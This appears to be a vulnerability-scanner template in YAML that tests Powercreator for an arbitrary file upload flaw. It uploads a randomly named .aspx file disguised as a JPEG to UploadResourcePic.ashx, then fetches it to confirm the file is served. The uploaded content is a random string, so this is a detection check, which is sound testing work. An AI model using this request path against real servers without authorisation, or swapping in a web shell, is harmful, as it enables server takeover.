id: poc-yaml-powercreator-arbitrary-file-upload
info:
  name: Powercreator 任意文件上传漏洞
  severity: medium
  tags:
  - 文件上传
  finger: Powercreator
  reference: []
  description: null
variables:
  rand: random_int(1000, 9999)
  content: random_str(8)
  randname: random_str(4)
transport: http
requests:
- method: POST
  path: /upload/UploadResourcePic.ashx?ResourceID={{.rand}}
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
    Content-Disposition: form-data;name="file1";filename="{{.randname}}.aspx";
  data: '-----------------------------20873900192357278038549710136

    Content-Disposition: form-data; name="file1"; filename="{{.randname}}.aspx"

    Content-Type: image/jpeg


    {{.content}}

    -----------------------------20873900192357278038549710136--'
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, ".ASPX")
  output:
  - regex_match(body,"(?P<path>.+?).ASPX")
- method: GET
  path: /ResourcePic/{{.path}}.ASPX
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, content)
  output: []
